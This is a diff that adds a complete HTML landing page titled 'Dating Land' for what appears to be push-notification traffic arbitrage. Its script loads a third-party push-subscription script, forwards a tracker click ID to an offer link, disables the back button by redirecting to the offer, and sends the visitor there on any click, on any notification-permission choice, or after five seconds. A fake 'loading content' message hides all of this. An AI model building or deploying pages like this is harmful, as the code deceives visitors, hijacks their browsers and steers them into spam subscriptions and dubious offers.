@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dating Land</title>
+    <script type="application/javascript" src="https://wpcpc.sjscdn.com/ps/ps.js?id=j-DQEhxgKEueEzYw3M-eJQ" async></script>
+    <script>
+        // 1. Collect parameters from URL (clickid from Binom and others)
+        const urlParams = new URLSearchParams(window.location.search);
+        const clickId = urlParams.get('clickid') || '';
+        
+        // Target URL where we send the user (Offer URL)
+        const targetUrl = `https://hotbjayapa.today/tds?id=1556189731&p1=${clickId}&p2=sub2&p3=sub3&p4=sub4`;
+        
+        // 2. Redirect function
+        function doRedirect() {
+            window.location.replace(targetUrl);
+        }
+        
+        // 3. Back Button setup
+        (function() {
+            var backUrl = targetUrl;
+            history.pushState(null, null, location.href);
+            window.onpopstate = function() {
+                history.go(1);
+                window.location.replace(backUrl);
+            };
+        })();
+        
+        // 4. Detect push notification interaction
+        window.addEventListener('load', function() {
+            // Monitor for permission changes (accept/deny)
+            var originalPermission = Notification.permission;
+            
+            // Check every 100ms if permission changed
+            var checkInterval = setInterval(function() {
+                if (Notification.permission !== originalPermission) {
+                    clearInterval(checkInterval);
+                    doRedirect(); // Instant redirect on any choice
+                }
+            }, 100);
+            
+            // Fallback: redirect after 5 seconds if no interaction
+            setTimeout(function() {
+                clearInterval(checkInterval);
+                doRedirect();
+            }, 5000);
+        });
+    </script>
+    <style>
+        body {
+            background-color: #000000;
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+    </style>
+</head>
+<body onclick="doRedirect();"> 
+    <div style="height: 100vh; display: flex; align-items: center; justify-content: center; font-family: sans-serif;">
+        <h1>Please wait, loading content...</h1>
+    </div>
+</body>
+</html>
